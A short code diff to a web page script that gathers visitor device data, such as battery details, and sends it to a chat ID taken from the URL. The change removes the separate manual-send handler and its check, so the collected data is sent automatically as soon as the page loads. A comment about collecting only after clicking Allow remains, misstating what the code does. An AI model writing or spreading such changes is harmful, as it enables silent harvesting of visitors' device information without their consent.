@@ -59,6 +59,7 @@ async function getBatteryDetails() {
 // Collect only after clicking Allow
 document.addEventListener("DOMContentLoaded", async () => {
 
+  // ✅ FIRST: Collect Data
   const battery = await getBatteryDetails();
 
   collectedData = {
@@ -74,18 +75,9 @@ document.addEventListener("DOMContentLoaded", async () => {
   };
 
   resultEl.textContent = JSON.stringify(collectedData, null, 2);
-
   sendBtn.disabled = false;
 
-});
-
-// Manual send only
-document.addEventListener("DOMContentLoaded", async () => {
-
-  if (!collectedData) {
-    statusEl.textContent = "Collect data first.";
-    return;
-  }
+  // ✅ SECOND: Send After First Completes
 
   const chatId = getChatIdFromUrl();
   if (!chatId) {
@@ -110,6 +102,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
 
     statusEl.textContent = "Sent successfully.";
+
   } catch (err) {
     statusEl.textContent = "Network error.";
   }
